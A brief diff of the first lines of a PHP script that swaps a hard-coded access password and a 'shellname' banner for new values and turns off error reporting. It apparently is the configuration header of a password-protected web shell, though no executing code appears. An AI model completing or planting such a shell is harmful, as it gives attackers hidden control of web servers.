@@ -1,7 +1,7 @@
 <?php
 header("Content-type:text/html;charset=utf8");
-$password='yzddmr6';
-$shellname='Hello By yzddmr6';
+$password='wangke';
+$shellname='Hello By WK';
 $myurl=null;
 error_reporting(0);
 ob_start();
